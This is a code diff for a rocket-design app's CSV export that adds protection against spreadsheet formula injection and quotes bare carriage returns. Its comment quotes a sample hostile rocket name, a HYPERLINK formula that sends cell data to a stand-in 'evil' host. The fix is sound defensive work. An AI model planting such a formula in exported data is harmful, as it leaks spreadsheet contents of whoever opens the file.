@@ -15,8 +15,22 @@ import { fmtSi, type UnitSelection } from '../prefs/units';
 /** Number → clean string with a fixed max decimals and a '.' decimal point. */
 const round = (v: number, d: number): string => (Number.isFinite(v) ? Number(v.toFixed(d)).toString() : '');
 
-/** RFC-4180 cell: quote when it contains a comma, quote or newline. */
-const cell = (s: string): string => (/[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s);
+/**
+ * RFC-4180 cell, with spreadsheet formula injection neutralized.
+ *
+ * Values here are file-sourced: `model.name` is the `<name>` of an imported
+ * `.ork` and the fin-set labels are its node names. A rocket named
+ * `=HYPERLINK("http://evil/?"&A1,"Open")` would otherwise execute when the
+ * exported CSV is opened in Excel or Sheets, so a leading formula trigger gets
+ * a `'` in front of it. Same rule as `flightPathExport.ts`.
+ *
+ * A lone `\r` is quoted too: the file's own terminator is `\r\n`, so an
+ * unquoted bare CR inside a name splits the record for RFC-4180 readers.
+ */
+const cell = (s: string): string => {
+  const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
+  return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
+};
 
 /** [field, value, unit] rows for one summary, in the user's units. */
 function summaryRows(info: StaticInfo, units: UnitSelection): [string, string, string][] {
@@ -61,12 +75,7 @@ export function buildDesignCsv(model: ReportModel, units: UnitSelection): string
     for (const s of st.sets) {
       const label = st.sets.length > 1 ? `${s.name}: ` : 'Fin set: ';
       push(st.stage, `${label}Nose to top of fin root`, fmtSi('length', units.length, s.topX, 3), units.length);
-      push(
-        st.stage,
-        `${label}Nose to bottom of fin root`,
-        fmtSi('length', units.length, s.bottomX, 3),
-        units.length,
-      );
+      push(st.stage, `${label}Nose to bottom of fin root`, fmtSi('length', units.length, s.bottomX, 3), units.length);
     }
   }
 
